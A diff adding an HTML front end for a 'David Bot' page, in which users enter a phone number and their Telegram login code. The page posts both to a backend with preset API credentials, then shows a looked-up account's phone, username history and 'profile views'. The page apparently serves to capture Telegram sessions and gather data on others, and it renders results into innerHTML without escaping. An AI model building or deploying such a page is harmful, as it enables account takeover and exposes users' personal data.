@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>David Bot - Get OTP</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+        }
+
+        .connection-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #4ecdc4;
+            font-weight: 600;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 10px;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .btn-otp {
+            background: linear-gradient(45deg, #ffc107, #ff9800);
+        }
+
+        .btn-telegram {
+            background: linear-gradient(45deg, #0088cc, #005599);
+        }
+
+        .btn-success {
+            background: linear-gradient(45deg, #00ff41, #00cc33);
+        }
+
+        .status-message {
+            text-align: center;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 12px;
+            display: none;
+        }
+
+        .status-otp-sent {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid #ffc107;
+            color: #ffc107;
+        }
+
+        .status-connected {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid #00ff41;
+            color: #00ff41;
+        }
+
+        .loading {
+            text-align: center;
+            color: #4ecdc4;
+            padding: 20px;
+            display: none;
+        }
+
+        .error {
+            background: rgba(255, 107, 107, 0.2);
+            border: 1px solid #ff6b6b;
+            color: #ff6b6b;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            display: none;
+            margin-top: 20px;
+        }
+
+        .result-container {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+        }
+
+        .info-icon {
+            font-size: 18px;
+            margin-right: 12px;
+            width: 30px;
+            text-align: center;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: #ccc;
+            margin-bottom: 2px;
+        }
+
+        .info-value {
+            font-size: 14px;
+            font-weight: bold;
+            color: #4ecdc4;
+        }
+
+        .api-info {
+            background: rgba(0, 136, 204, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #0088cc;
+        }
+
+        .otp-section {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🤖 David Bot</h1>
+            <p>Get OTP & Connect</p>
+        </div>
+
+        <div class="api-info">
+            ✅ API Credentials Pre-Set - Enter Phone & Get OTP
+        </div>
+
+        <div class="status-message status-otp-sent" id="statusOtpSent">
+            📲 OTP Sent to Your Telegram - Check Your App
+        </div>
+
+        <div class="status-message status-connected" id="statusConnected">
+            ✅ Connected to Telegram - Ready to use!
+        </div>
+
+        <div class="connection-section" id="connectionSection">
+            <div class="input-group">
+                <label for="phoneNumber">📱 Your Phone Number</label>
+                <input type="text" id="phoneNumber" class="input-field" placeholder="+91XXXXXXXXXX">
+            </div>
+
+            <button class="btn btn-otp" onclick="requestOTP()" id="getOtpBtn">
+                📨 Get OTP
+            </button>
+
+            <div class="otp-section" id="otpSection">
+                <div class="input-group">
+                    <label for="phoneCode">🔐 Enter OTP Code</label>
+                    <input type="text" id="phoneCode" class="input-field" placeholder="Enter OTP from Telegram">
+                </div>
+
+                <button class="btn btn-success" onclick="verifyOTP()">
+                    ✅ Verify OTP & Connect
+                </button>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label for="username">👤 Telegram Username</label>
+            <input type="text" id="username" class="input-field" placeholder="@username" value="@Royal_smart_boy">
+        </div>
+
+        <button class="btn btn-telegram" onclick="sendToDavidBot()" id="sendToBotBtn" style="display: none;">
+            🚀 Send to David Bot
+        </button>
+
+        <div class="loading" id="loading">
+            ⏳ Processing...
+        </div>
+
+        <div class="error" id="error">
+            ❌ Error occurred
+        </div>
+
+        <div class="result-container" id="resultContainer">
+            <!-- Results will appear here -->
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = '/api';
+
+        async function requestOTP() {
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+            if (!phoneNumber) {
+                showError('Please enter your phone number');
+                return;
+            }
+
+            showLoading('Requesting OTP...');
+
+            try {
+                const response = await fetch(API_BASE + '/request-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber })
+                });
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    hideLoading();
+                    // Show OTP section
+                    document.getElementById('otpSection').style.display = 'block';
+                    document.getElementById('getOtpBtn').style.display = 'none';
+                    document.getElementById('statusOtpSent').style.display = 'block';
+                    
+                    // Focus on OTP input
+                    document.getElementById('phoneCode').focus();
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (err) {
+                hideLoading();
+                showError('OTP request failed: ' + err.message);
+            }
+        }
+
+        async function verifyOTP() {
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const phoneCode = document.getElementById('phoneCode').value.trim();
+
+            if (!phoneCode) {
+                showError('Please enter OTP code');
+                return;
+            }
+
+            showLoading('Verifying OTP...');
+
+            try {
+                const response = await fetch(API_BASE + '/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phoneNumber,
+                        phoneCode 
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    hideLoading();
+                    document.getElementById('connectionSection').style.display = 'none';
+                    document.getElementById('statusOtpSent').style.display = 'none';
+                    document.getElementById('statusConnected').style.display = 'block';
+                    document.getElementById('sendToBotBtn').style.display = 'block';
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (err) {
+                hideLoading();
+                showError('OTP verification failed: ' + err.message);
+            }
+        }
+
+        async function sendToDavidBot() {
+            const username = document.getElementById('username').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+            if (!username) {
+                showError('Please enter a username');
+                return;
+            }
+
+            showLoading('Sending to David Bot...');
+
+            try {
+                const response = await fetch(API_BASE + '/send-to-bot', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phoneNumber,
+                        username 
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.success) {
+                    hideLoading();
+                    displayResults(data.data);
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (err) {
+                hideLoading();
+                showError('Failed to send to bot: ' + err.message);
+            }
+        }
+
+        function displayResults(data) {
+            const resultContainer = document.getElementById('resultContainer');
+            
+            resultContainer.innerHTML = `
+                <div style="margin-bottom: 20px;">
+                    <div class="info-item">
+                        <div class="info-icon">💬</div>
+                        <div>
+                            <div class="info-label">USER ID</div>
+                            <div class="info-value">${data.id}</div>
+                        </div>
+                    </div>
+
+                    <div class="info-item">
+                        <div class="info-icon">📞</div>
+                        <div>
+                            <div class="info-label">PHONE NUMBER</div>
+                            <div class="info-value">${data.phone}</div>
+                        </div>
+                    </div>
+
+                    <div class="info-item">
+                        <div class="info-icon">👤</div>
+                        <div>
+                            <div class="info-label">CURRENT USERNAME</div>
+                            <div class="info-value">${data.currentUsername}</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div style="margin: 20px 0;">
+                    <div style="color: #ff6b6b; font-weight: bold; margin-bottom: 10px;">🕓 USERNAME HISTORY</div>
+                    ${data.history.map(item => `
+                        <div style="background: rgba(255,255,255,0.05); padding: 8px; border-radius: 6px; margin-bottom: 5px; font-size: 13px;">
+                            ${item}
+                        </div>
+                    `).join('')}
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; text-align: center;">
+                        <div style="font-size: 18px; color: #ff6b6b; font-weight: bold;">${data.profileViews}</div>
+                        <div style="font-size: 11px; color: #ccc;">PROFILE VIEWS</div>
+                    </div>
+                    <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; text-align: center;">
+                        <div style="font-size: 18px; color: #ff6b6b; font-weight: bold;">${data.history.length}</div>
+                        <div style="font-size: 11px; color: #ccc;">USERNAME CHANGES</div>
+                    </div>
+                </div>
+
+                <div style="margin-top: 15px; padding: 10px; background: rgba(0,136,204,0.2); border-radius: 8px; text-align: center;">
+                    <div style="color: #0088cc; font-size: 12px;">✅ ${data.source}</div>
+                </div>
+            `;
+
+            resultContainer.style.display = 'block';
+        }
+
+        function showLoading(message) {
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('loading').textContent = message;
+            document.getElementById('error').style.display = 'none';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        function showError(message) {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('error').style.display = 'block';
+            document.getElementById('error').textContent = message;
+        }
+
+        // Enter key support
+        document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                requestOTP();
+            }
+        });
+
+        document.getElementById('phoneCode').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyOTP();
+            }
+        });
+
+        document.getElementById('username').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendToDavidBot();
+            }
+        });
+    </script>
+</body>
+</html>
